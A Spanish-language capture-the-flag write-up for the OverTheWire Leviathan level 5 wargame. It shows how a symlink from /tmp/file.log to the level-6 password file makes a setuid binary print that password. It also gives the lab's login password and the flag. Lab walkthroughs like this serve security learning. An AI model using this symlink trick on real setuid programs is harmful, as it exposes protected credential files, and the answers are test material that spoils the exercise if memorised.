## Leviathan Level 5 → Level 6

## Level Goal

There is no information for this level, intentionally.

## Write Up Iker 

Fácil. Tenemos que conectarnos por **SSH** a la dirección **leviathan.labs.overthewire.org** en el puerto **2223** con los siguientes datos:

```bash
  - User: leviathan5
  - Pass: Tith4cokei
```

Escribimos el siguiente comando en la consola:
  
```bash 
$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

Accedemos sin problemas y vemos que no hay ningun fichero

```bash
leviathan5@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan6 leviathan5 7642 Jun 15 11:38 leviathan5
```
Ejecutamos el fichero.

```bash
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485ed, 1, 0xffffd7f4, 0x8048690 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                   = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                                             = 26
exit(-1 <no return ...>
+++ exited (status 255) +++

```

```
Tras ejecutar el comando **ltrace** vemos que ejecuta una funcion de lectura sobre **/tmp/file.log** . 

Vamos a crear un **enlace simbólico** a la carpeta donde se encuentran las contraseñas **/etc/leviathan_pass/leviathan6** con el objetivo que lea el contenido de ese fichero al ejecutar la funcion **fopen**.

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan6 leviathan5 7642 Jun 15 11:38 leviathan5
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```

¡Obtenemos la contraseña! :beer:

:v: :sunglasses: :v:

**FLAG** = {UgaoFee4li} 
